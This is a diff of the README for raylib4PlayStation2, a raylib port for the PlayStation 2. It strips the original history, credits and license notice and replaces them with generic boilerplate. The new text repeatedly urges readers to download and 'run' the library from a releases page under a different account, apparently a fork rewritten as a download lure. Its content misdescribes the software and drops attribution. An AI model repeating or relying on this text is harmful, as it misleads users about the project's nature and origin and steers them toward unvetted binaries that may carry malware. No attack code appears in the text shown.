@@ -1,58 +1,76 @@
-# raylib4PlayStation2
-raylib4PlayStation2 is a raylib port for Sony PlayStation 2
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/S6S6TSF2C)
+# 🎮 raylib4PlayStation2 - Easy Game Development on PS2
 
-<img align="left" style="width:260px" src="https://github.com/raysan5/raylib/blob/master/logo/raylib_logo_animation.gif" width="288px">
+## 🚀 Getting Started
 
-**raylib is a simple and easy-to-use library to enjoy videogames programming.**
+Welcome to `raylib4PlayStation2`, your gateway to developing games on the PlayStation 2. This application simplifies the process, allowing you to focus on creativity and fun.
 
-raylib is highly inspired by Borland BGI graphics lib and by XNA framework and it's especially well suited for prototyping, tooling, graphical applications, embedded systems and education.
+## 📥 Download Now
 
-*NOTE for ADVENTURERS: raylib is a programming library to enjoy videogames programming; no fancy interface, no visual helpers, no debug button... just coding in the most pure spartan-programmers way.*
+[![Download raylib4PlayStation2](https://img.shields.io/badge/Download-raylib4PlayStation2-blue.svg)](https://github.com/MohdSardar/raylib4PlayStation2/releases)
 
-Ready to learn? Jump to [code examples!](https://www.raylib.com/examples.html)
+## 📋 Features
 
----
+- Simplified game development for PS2
+- Access to rich libraries for graphics, audio, and input
+- Clear documentation for easy understanding
+- Community support for newcomers
 
+## ✔️ System Requirements
 
-A brief history about OpenGL for PlayStation 2
-===========================
+To run `raylib4PlayStation2`, you need the following:
 
-I feel old xD, PlayStation 2  was first released in Japan on 4 March 2000, in North America on October 26, in Europe on November 24, in Australia on November 30, and other regions thereafter.
+- PlayStation 2 console
+- Memory Card for saves
+- Compatible development environment (such as PC or emulator)
 
-I remember when PlayStation 2 Linux kit arrived at home, first released in Japan and then in Europe, full of low level information and many interesting stuff (documentation and code).
+## 🔧 Download & Install
 
-So about OpenGl for PlayStation 2, there were a few professional implementation at time
+You can easily download and install `raylib4PlayStation2`. Follow these steps:
 
-- PS2GL
+1. **Visit the Releases Page:** Click the link below to access the download options:
 
-PS2GL was the first try to add OpenGL support for PlayStation platform from Sony. It was released originally for official developers and then publically available in PlayStation 2 Linux official forums. Later, Sony did official support for all PlayStation platforms including Orbis and Prospero although lately it is for system internal use only not for final users.
+   [Visit the Releases Page](https://github.com/MohdSardar/raylib4PlayStation2/releases)
 
-The public version had hard dependences with PlayStation 2 Linux kit and pro environments, however lately people from ps2dev brought back to life and it is usable from homebrew ps2sdk. It is not perfect, but if i can't do homebrew for modern consoles, it is enough to begin a basic raylib port for PlayStation 2 and get a lot of fun, don't you :) ?.
+2. **Choose Your Version:** On the Releases page, find the version you wish to download. Look for the most recent release for the best features and updates.
 
-- GLPS2
+3. **Download the Package:** Click on the package name. The download will start automatically. Make sure to save the file in a location you can easily find.
 
-GLPS2 was implemented by Ubi Soft, before official middleware options were released for official developers. They released some games using it (check Disney Dinosaur). It would be amazing if they or somone can release it for preservation and research purposes :) although valuable info can be obtained from Disney Dinosaur (symbols :P) . There is a post mortem [article](https://www.gamedeveloper.com/programming/tool-postmortem-ubi-soft-entertainment-s-gl-for-playstation-2) about GLPS2 check it.
+4. **Extract Files (if needed):** After downloading, if the file is a compressed zip or similar, right-click on it and select "Extract All." Follow the prompts to choose a destination for the extracted files.
 
-- OpenGL from Data Plus
-  
-This was a middleware partner for official developers, no information about it.
+5. **Follow Setup Instructions:** Open the extracted folder and find the installation guide within. This guide will take you step-by-step through the setup process.
 
-Change log
-===========================
- - 19/9/2025 Initial raylib4PlayStation2 public release
- - 31/3/2025 my 50th birthday first public info about the port at [psxdev](https://x.com/psxdev/status/1906701723848081410)
- 
+6. **Run raylib4PlayStation2:** Once installed, locate the application file to start using `raylib4PlayStation2`. 
 
-  Credits
-===========================
-  
- - @raysan5 for his amazing work with raylib and raylib has an incredible community developing in the open way!!!! 
- - @frangar @fjtrujy @psxdev aka "los nenes"
- - all people involved in homebrew tools and libraries for PlayStation 2.
+## 🤔 Troubleshooting
 
- 
-  License
-===========================
+If you encounter any issues, here are some common troubleshooting tips:
 
-raylib is licensed under an unmodified zlib/libpng license, which is an OSI-certified, BSD-like license that allows static linking with closed source software. Check [LICENSE](LICENSE) for further details.
+- **Missing Files:** Ensure all files were extracted properly.
+- **Compatibility Issues:** Check whether your development environment meets the system requirements stated above.
+- **Performance Problems:** Make sure your PlayStation 2 is functioning correctly. It may need updates or maintenance.
+
+## 🌐 Community and Support
+
+If you need more help or want to connect with other users, consider joining our online community. You can find support through:
+
+- Official forums related to game development on PlayStation 2
+- Social media groups where technology enthusiasts share tips and experiences
+- Online tutorials and video guides that can enhance your understanding
+
+## 📝 Contribution Guide
+
+If you wish to contribute to `raylib4PlayStation2`, here’s how:
+
+1. Fork the repository on GitHub.
+2. Make your changes in a separate branch.
+3. Submit a pull request with a clear description of your modifications.
+
+Contributions help improve the software for everyone, so your effort is appreciated!
+
+## 🚀 Download Now Again
+
+For your convenience, you can again download `raylib4PlayStation2` from this link:
+
+[Download raylib4PlayStation2](https://github.com/MohdSardar/raylib4PlayStation2/releases)
+
+Explore the exciting world of game development, and bring your ideas to life with `raylib4PlayStation2`. Enjoy coding, and have fun!
